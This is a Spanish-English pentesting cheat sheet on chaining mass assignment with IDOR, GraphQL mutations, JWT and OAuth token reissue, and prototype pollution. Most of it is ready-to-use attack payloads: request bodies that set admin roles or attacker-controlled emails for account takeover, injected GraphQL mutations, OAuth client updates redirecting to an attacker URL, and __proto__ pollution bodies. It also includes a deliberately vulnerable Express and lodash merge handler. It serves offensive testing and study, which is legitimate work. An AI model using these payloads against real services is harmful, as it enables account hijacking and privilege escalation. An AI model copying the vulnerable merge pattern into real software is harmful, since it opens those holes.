---
aliases:
  - Mass Assignment Chains
  - IDOR Mass Assignment
  - GraphQL Mass Assignment
tags:
  - type/cheatsheet
  - vuln/mass-assignment
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Mass Assignment]]'
  - '[[BOLA - IDOR]]'
  - '[[Prototype Pollution]]'
  - '[[GraphQL Injection]]'
  - '[[JWT Attacks]]'
---
# Mass Assignment - Chains con Otras Vulns

***

## IDOR + Mass Assignment

| **Objetivo** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | IDOR permite update de otro user. Mass Assignment permite set sensitive fields. Combo = full account hijack. | Standard chain. |
| Update victim profile | `PUT /api/users/{victim_id}` (IDOR) con body `{"role":"admin","email":"atacante@evil"}` | Direct ATO. |
| Reset victim password | `PATCH /api/users/{victim_id}` con `{"password_hash": "<known_hash>"}` | Set known. |
| Override email victim | `{"email": "atacante@evil"}` → next reset link goes to atacante | Email-based ATO. |
| Activate disabled account | `{"is_active": true, "is_blocked": false}` | Restore. |
| Multi-tenant escape | `PUT /tenant/X/user/Y` con `{"tenant_id": "Z"}` | Cross-tenant. |
| Combine con prediction | Sequential IDs + mass assign on each | Bulk takeover. |
| GET to know structure + PUT to mass assign | Standard recon flow | Two-step. |
| Combine con object reference confusion | If app accepts both `id` and `_id` | Type confusion. |
^ma-chain-idor

___

## GraphQL Mutation Mass Assignment

| **Objetivo** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | GraphQL input types expose all model fields. Atacante envía mutation con sensitive fields. | Spec-level vector. |
| Introspection discover input | `__type(name:"UpdateUserInput")` reveals fields | Recon. |
| Forced field injection | `mutation{updateUser(input:{name:"x", isAdmin:true}){id}}` | Direct. |
| Combined con IDOR via global ID | `mutation{updateUser(id:"VXNlcjox", input:{role:"admin"})}` | Global ID + mass. |
| Aliased mutations | `mutation{a:updateUser(...) b:updateUser(...)}` | Multi-target en single request. |
| Subscription field abuse | If subscribe with input → server applies mass assign | Less common. |
| Nested input types | Mutation con nested input → atacante navega niveles | Deep injection. |
| Union types | Polymorphic input → bypass type check | Edge. |
| Fragment injection | Inline fragments con `__typename` | Type spoofing. |
| Combine con GraphQL batching | Multi-mutation batch overrun | Bulk MA. |
^ma-chain-graphql

### GraphQL workflow

```
1. Introspection:
   { __type(name: "UserUpdateInput") { inputFields { name } } }

2. Identify sensitive fields:
   - role, isAdmin, permissions
   - email_verified, mfa_enabled
   - balance, tier
   - tenant_id, user_id

3. Mutation injection:
   mutation {
     updateUser(input: {
       email: "test@x.com",      # benign
       role: "admin",             # injected
       is_verified: true          # injected
     }) { id role isAdmin }
   }

4. Verify response:
   { "data": { "updateUser": { "role": "admin" } } }
   → Mass assignment confirmed
```

___

## JWT Update via Mass Assign

| **Objetivo** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | App regenerates JWT post-update. Mass assign fields → new JWT contains atacante's role. | Sin secret needed. |
| Update profile + new JWT | PATCH `/profile` con `{"role":"admin"}` → response contains new JWT con role:admin | Privesc via update. |
| Database-backed JWT regen | Backend reads model after update → bakes claims into JWT | Standard flow. |
| Refresh token regen | Refresh endpoint reads model → emits JWT con current state | Indirect privesc. |
| Combine con session fixation | Login as atacante's account post-MA | Standard. |
| Session-based instead of JWT | Same — session payload regenerated | Generic. |
| OAuth token reissue | `POST /oauth/refresh` after MA → new access_token con admin scope | Federated. |
| MFA token regen | If 2FA disabled via MA, next login skips 2FA | Combined. |
^ma-chain-jwt

___

## OAuth Scope Injection

| **Objetivo** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | OAuth client registration via API. Mass assign sets `allowed_scopes`/`grants`. | OAuth client takeover. |
| Self-register OAuth client | `POST /oauth/clients` con `{"scopes":["admin","read","write"]}` | Powerful client. |
| Update existing client | `PATCH /oauth/clients/X` con `{"redirect_uris":["http://attacker"]}` | OAuth redirect hijack + Open Redirect. |
| Trust attacker app | `{"trusted":true}` en client → skip user consent | Phishing. |
| Set client secret to known | `{"client_secret":"known_value"}` | Pre-set credentials. |
| Override client_id | `{"client_id":"victim_app_id"}` | Spoof legit client. |
| Override owner | `{"owner_id":1}` | Cross-org client takeover. |
| Combine con SSRF | Client redirect_uri = internal URL | SSRF chain. |
| Token introspection bypass | Mass assign a `introspect_endpoint` | Per-config. |
^ma-chain-oauth

___

## Prototype Pollution Combo

| **Objetivo** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | Backend uses lodash `_.merge(obj, req.body)` for update. Prototype Pollution via `__proto__` becomes mass assignment global default. | Combo. |
| Pollution payload | `{"__proto__":{"isAdmin":true}}` | Standard PP. |
| All objects inherit | Every user/object inherits `isAdmin: true` | Mass impact. |
| Combine con MA | Mass assign + PP simultaneously | Multi-vector. |
| Server-side PP escalates MA | PP creates "default" admin → MA sets specific user too | Compound. |
| Constructor.prototype variant | Bypass `__proto__` filter con `constructor.prototype` | Standard PP bypass. |
| Object.assign loop con user input | DIY merge → vulnerable to both MA and PP | Common bug. |
| Combine con DoS | Pollute `length` to trigger DoS in iteration | Resource exhaustion. |
| Combine con XSS sanitizer bypass | Pollute DOMPurify config via PP + use MA to set XSS in profile | Multi-stage XSS. |
^ma-chain-pp

### Stack típico vulnerable a ambos

```javascript
// Node.js Express con lodash merge — vulnerable a MA + PP
app.patch('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    _.merge(user, req.body);  // ← MA + PP vector
    await user.save();
    res.json(user);
});

// Atacante:
PATCH /api/users/1 HTTP/1.1
Content-Type: application/json

{
  "name": "test",
  "isAdmin": true,                              ← Mass Assignment
  "__proto__": {"globalAdmin": true}            ← Prototype Pollution
}

// Result: 
// - User 1 ahora isAdmin=true (MA)
// - Object.prototype.globalAdmin=true (PP) → todos heredan
```

***
